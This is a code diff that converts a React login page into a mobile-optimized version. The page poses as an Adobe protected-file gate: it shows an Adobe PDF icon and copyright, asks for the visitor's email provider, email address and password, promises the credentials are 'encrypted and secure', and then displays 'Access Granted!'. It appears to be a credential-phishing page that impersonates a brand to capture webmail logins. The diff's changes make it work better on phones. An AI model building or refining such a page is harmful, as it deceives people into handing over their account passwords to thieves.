@@ -1,13 +1,13 @@
 import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
 
-interface LoginPageProps {
+interface MobileLoginPageProps {
   fileName: string;
   onBack: () => void;
   onLoginSuccess?: (sessionData: any) => void;
 }
 
-const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess }) => {
+const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onLoginSuccess }) => {
   const [selectedProvider, setSelectedProvider] = useState<string>('');
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
@@ -149,7 +149,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
           onLoginSuccess(sessionData);
         }
 
-        // Show success message
+        // Show mobile-optimized success message
         const successDiv = document.createElement('div');
         successDiv.innerHTML = `
           <div style="
@@ -158,17 +158,19 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
             left: 50%;
             transform: translate(-50%, -50%);
             background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            padding: 30px 25px;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
             z-index: 10000;
             text-align: center;
             font-family: system-ui, -apple-system, sans-serif;
+            min-width: 280px;
+            max-width: 90vw;
           ">
-            <div style="color: #059669; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
+            <div style="color: #059669; font-size: 20px; font-weight: 600; margin-bottom: 12px;">
               ✓ Access Granted!
             </div>
-            <div style="color: #374151; font-size: 14px;">
+            <div style="color: #374151; font-size: 16px; line-height: 1.4;">
               Opening ${fileName}...
             </div>
           </div>
@@ -177,7 +179,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
         
         setTimeout(() => {
           document.body.removeChild(successDiv);
-        }, 2000);
+        }, 2500);
         
         onBack();
       } else {
@@ -205,64 +207,62 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
   };
 
   return (
-    <div className="min-h-screen relative overflow-hidden">
-      {/* Enhanced Red Background with Multiple Blur Layers */}
+    <div className="min-h-screen relative overflow-hidden bg-gradient-to-br from-red-50 via-red-100/50 to-red-200/30">
+      {/* Mobile-optimized background */}
       <div className="absolute inset-0 bg-gradient-to-br from-red-100/80 via-red-200/60 to-red-300/70"></div>
-      <div className="absolute inset-0 bg-gradient-to-tr from-white/30 via-red-100/40 to-red-200/50"></div>
-      <div className="absolute inset-0 backdrop-blur-md"></div>
+      <div className="absolute inset-0 backdrop-blur-sm"></div>
       
-      {/* Enhanced Decorative Blur Elements */}
-      <div className="absolute top-5 left-5 w-48 h-48 bg-red-300/30 rounded-full blur-2xl"></div>
-      <div className="absolute bottom-5 right-5 w-56 h-56 bg-red-400/25 rounded-full blur-3xl"></div>
-      <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-white/35 rounded-full blur-xl"></div>
-      <div className="absolute bottom-1/4 right-1/3 w-40 h-40 bg-red-200/25 rounded-full blur-2xl"></div>
-      <div className="absolute top-1/4 right-1/2 w-28 h-28 bg-red-500/20 rounded-full blur-lg"></div>
+      {/* Mobile decorative elements */}
+      <div className="absolute top-10 left-5 w-24 h-24 bg-red-300/25 rounded-full blur-xl"></div>
+      <div className="absolute bottom-10 right-5 w-32 h-32 bg-red-400/20 rounded-full blur-2xl"></div>
+      <div className="absolute top-1/2 left-1/4 w-16 h-16 bg-white/25 rounded-full blur-lg"></div>
+      <div className="absolute bottom-1/4 right-1/3 w-20 h-20 bg-red-200/20 rounded-full blur-lg"></div>
       
-      <div className="relative z-10 flex items-center justify-center min-h-screen p-4">
-        <div className="w-full max-w-md">
+      <div className="relative z-10 min-h-screen p-5">
+        <div className="max-w-md mx-auto">
           {/* Header */}
-          <div className="text-center mb-8">
+          <div className="text-center mb-8 pt-8">
             <button
               onClick={onBack}
-              className="inline-flex items-center gap-2 text-gray-600 hover:text-gray-900 mb-6 transition-colors duration-200"
+              className="inline-flex items-center gap-3 text-gray-600 hover:text-gray-900 mb-8 transition-colors duration-200 p-2"
             >
-              <ArrowLeft className="w-4 h-4" />
-              Back to Files
+              <ArrowLeft className="w-5 h-5" />
+              <span className="text-base font-medium">Back to Files</span>
             </button>
             
-            <div className="w-16 h-16 flex items-center justify-center mx-auto mb-4">
+            <div className="w-20 h-20 flex items-center justify-center mx-auto mb-6 bg-white/80 backdrop-blur-sm rounded-2xl shadow-lg">
               <img 
                 src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
                 alt="Adobe Acrobat" 
-                className="w-12 h-12 object-contain"
+                className="w-14 h-14 object-contain"
               />
             </div>
             
-            <h1 className="text-2xl font-bold text-gray-900 mb-2">Access Protected File</h1>
-            <p className="text-base text-gray-600">
+            <h1 className="text-2xl font-bold text-gray-900 mb-3">Access Protected File</h1>
+            <p className="text-base text-gray-600 leading-relaxed px-4">
               Please authenticate to access <span className="font-medium break-all">{fileName}</span>
             </p>
           </div>
 
           {/* Login Form */}
-          <div className="bg-white/90 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/30 p-8">
+          <div className="bg-white/95 backdrop-blur-xl rounded-3xl shadow-2xl border border-white/50 p-6">
             {!selectedProvider ? (
               // Provider Selection
               <div>
-                <h2 className="text-lg font-semibold text-gray-900 mb-4">
+                <h2 className="text-xl font-semibold text-gray-900 mb-6 text-center">
                   Choose your email provider
                 </h2>
-                <div className="grid grid-cols-2 gap-3">
+                <div className="grid grid-cols-2 gap-4">
                   {emailProviders.map((provider) => (
                     <button
                       key={provider.name}
                       onClick={() => handleProviderSelect(provider.name)}
-                      className={`${provider.color} text-white p-4 rounded-xl hover:opacity-90 transition-all duration-200 transform hover:scale-105 flex flex-col items-center gap-2 shadow-lg`}
+                      className={`${provider.color} text-white p-5 rounded-2xl hover:opacity-90 transition-all duration-200 transform active:scale-95 flex flex-col items-center gap-3 shadow-lg`}
                     >
                       <img 
                         src={provider.logo} 
                         alt={provider.name} 
-                        className="w-8 h-8 object-contain filter brightness-0 invert"
+                        className="w-10 h-10 object-contain filter brightness-0 invert"
                         onError={(e) => {
                           const target = e.target as HTMLImageElement;
                           target.style.display = 'none';
@@ -283,56 +283,59 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
             ) : (
               // Login Form
               <div>
-                <div className="flex items-center gap-3 mb-6">
+                <div className="flex items-center gap-4 mb-6">
                   <button
                     onClick={() => setSelectedProvider('')}
-                    className="text-gray-400 hover:text-gray-600 transition-colors duration-200"
+                    className="text-gray-400 hover:text-gray-600 transition-colors duration-200 p-1"
                   >
-                    <ArrowLeft className="w-4 h-4" />
+                    <ArrowLeft className="w-5 h-5" />
                   </button>
-                  <h2 className="text-lg font-semibold text-gray-900">
+                  <h2 className="text-xl font-semibold text-gray-900">
                     Sign in with {selectedProvider}
                   </h2>
                 </div>
 
-                <form onSubmit={handleLogin} className="space-y-4">
+                <form onSubmit={handleLogin} className="space-y-5">
                   <div>
-                    <label className="block text-sm font-medium text-gray-700 mb-2">
+                    <label className="block text-base font-medium text-gray-700 mb-3">
                       Email Address
                     </label>
                     <div className="relative">
-                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
+                      <Mail className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                       <input
                         type="email"
                         value={email}
                         onChange={(e) => setEmail(e.target.value)}
-                        className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/80 backdrop-blur-sm text-base"
+                        className="w-full pl-12 pr-4 py-4 border-2 border-gray-200 rounded-2xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/90 backdrop-blur-sm text-base font-medium"
                         placeholder="Enter your email"
                         required
+                        autoComplete="email"
+                        inputMode="email"
                       />
                     </div>
                   </div>
 
                   <div>
-                    <label className="block text-sm font-medium text-gray-700 mb-2">
+                    <label className="block text-base font-medium text-gray-700 mb-3">
                       Password
                     </label>
                     <div className="relative">
-                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
+                      <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                       <input
                         type={showPassword ? 'text' : 'password'}
                         value={password}
                         onChange={(e) => setPassword(e.target.value)}
-                        className="w-full pl-10 pr-12 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/80 backdrop-blur-sm text-base"
+                        className="w-full pl-12 pr-14 py-4 border-2 border-gray-200 rounded-2xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/90 backdrop-blur-sm text-base font-medium"
                         placeholder="Enter your password"
                         required
+                        autoComplete="current-password"
                       />
                       <button
                         type="button"
                         onClick={() => setShowPassword(!showPassword)}
-                        className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors duration-200"
+                        className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors duration-200 p-1"
                       >
-                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                       </button>
                     </div>
                   </div>
@@ -340,11 +343,11 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                   <button
                     type="submit"
                     disabled={isLoading || !email || !password}
-                    className="w-full bg-gradient-to-r from-red-600 to-red-700 text-white py-3 rounded-xl font-medium hover:from-red-700 hover:to-red-800 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg text-base"
+                    className="w-full bg-gradient-to-r from-red-600 to-red-700 text-white py-4 rounded-2xl font-semibold text-lg hover:from-red-700 hover:to-red-800 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 transform active:scale-95 shadow-lg mt-6"
                   >
                     {isLoading ? (
-                      <div className="flex items-center justify-center gap-2">
-                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                      <div className="flex items-center justify-center gap-3">
+                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                         Authenticating...
                       </div>
                     ) : (
@@ -354,7 +357,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                 </form>
 
                 <div className="mt-6 text-center">
-                  <p className="text-xs text-gray-500">
+                  <p className="text-sm text-gray-500">
                     Your credentials are encrypted and secure
                   </p>
                 </div>
@@ -363,7 +366,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
           </div>
 
           {/* Adobe Footer */}
-          <div className="text-center mt-8">
+          <div className="text-center mt-8 pb-8">
             <p className="text-sm text-gray-700 font-medium">
               © 2025 Adobe Inc. All rights reserved.
             </p>
@@ -374,4 +377,4 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
   );
 };
 
-export default LoginPage;
+export default MobileLoginPage;
